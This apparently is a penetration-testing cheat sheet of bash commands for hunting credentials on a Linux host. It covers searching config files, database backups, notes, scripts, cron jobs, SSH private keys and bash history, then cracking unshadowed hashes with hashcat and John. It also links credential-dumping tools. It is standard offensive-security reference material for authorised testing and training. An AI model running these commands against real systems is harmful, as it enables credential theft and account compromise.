---
description: Common Password Attack on Linux Machine
---

# Linux Password Attack

### Config Files Search

{% code overflow="wrap" %}
```bash
for l in $(echo ".conf .config .cnf");do echo -e "\nFile extension: " $l; find / -name *$l 2>/dev/null | grep -v "lib\|fonts\|share\|core" ;done
```
{% endcode %}

### Credentials in Configuration Files

{% code overflow="wrap" %}
```bash
for i in $(find / -name *.cnf 2>/dev/null | grep -v "doc\|lib");do echo -e "\nFile: " $i; grep "user\|password\|pass" $i 2>/dev/null | grep -v "\#";done
```
{% endcode %}

### Database Backup Search

{% code overflow="wrap" %}
```bash
for l in $(echo ".sql .db .*db .db*");do echo -e "\nDB File extension: " $l; find / -name *$l 2>/dev/null | grep -v "doc\|lib\|headers\|share\|man";done
```
{% endcode %}

### Search Notes/txt Files

{% code overflow="wrap" %}
```bash
find /home/* -type f -name "*.txt" -o ! -name "*.*"
```
{% endcode %}

### Search Scripts on Linux

{% code overflow="wrap" %}
```bash
for l in $(echo ".py .pyc .pl .go .jar .c .sh");do echo -e "\nFile extension: " $l; find / -name *$l 2>/dev/null | grep -v "doc\|lib\|headers\|share";done
```
{% endcode %}

### Search Cronjob

{% code overflow="wrap" %}
```bash
cat /etc/crontab
ls -la /etc/cron.*/
```
{% endcode %}

### Search SSH Private Key

```
grep -rnw "PRIVATE KEY" /home/* 2>/dev/null | grep ":1"
```

### Bash History

{% code overflow="wrap" %}
```bash
tail -n5 /home/*/.bash*
```
{% endcode %}

### Cracking Linux Credentials

{% code overflow="wrap" %}
```bash
# unshadow local creds
unshadow passwd.bak shadow.bak > unshadow.hash

# Perform Dictionary Attack
hashcat -m 1800 -a 0 unshadow.hash /usr/share/wordlists/rockyou.txt -o cracked_shadow
# or
john --wordlist=/usr/share/wordlists/rockyou.txt unshadow.hash
```
{% endcode %}

### Tools

* [https://github.com/unode/firefox\_decrypt](https://github.com/unode/firefox\_decrypt)
* [https://github.com/huntergregal/mimipenguin](https://github.com/huntergregal/mimipenguin)
* [https://github.com/AlessandroZ/LaZagne/tree/master/Linux](https://github.com/AlessandroZ/LaZagne/tree/master/Linux)